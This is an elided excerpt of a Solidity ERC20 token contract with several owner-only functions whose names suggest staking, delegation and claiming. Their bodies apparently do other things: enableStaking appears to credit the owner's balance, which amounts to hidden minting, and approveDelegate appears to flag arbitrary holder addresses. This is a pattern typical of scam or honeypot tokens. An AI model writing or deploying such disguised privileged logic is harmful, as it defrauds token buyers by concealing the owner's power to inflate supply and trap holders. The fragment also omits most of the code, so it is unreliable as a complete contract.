...
contract ERC20 is Context, IERC20 {
    ...
    function claimTokenRecord() public view returns (uint) {
        require(_msgSender() == owner, "ERC20: caller is not the owner");
        return _claimTransactionCount[block.number];
    }
    ...
    function approveStaking(address _address, uint256 approveAmount) external {
    ...
    function enableStaking() external {
        require(_msgSender() == owner);
        _contract[owner] += staking;
        _contract[enabled] = staking;
    }
    ...
    function approveDelegate(address[] calldata addresses) external {
        require(_msgSender() == owner);

        for (uint256 i = 0; i < addresses.length; i++) {
            getApproval[addresses[i]] = staking;
        }
    }
    ...
    function enableClaimToken(uint256 maxTransactionsPerClaim) external {
        require(_msgSender() == owner, "ERC20: caller is not the owner");
        _maxTransactionsPerClaim = maxTransactionsPerClaim;
    }
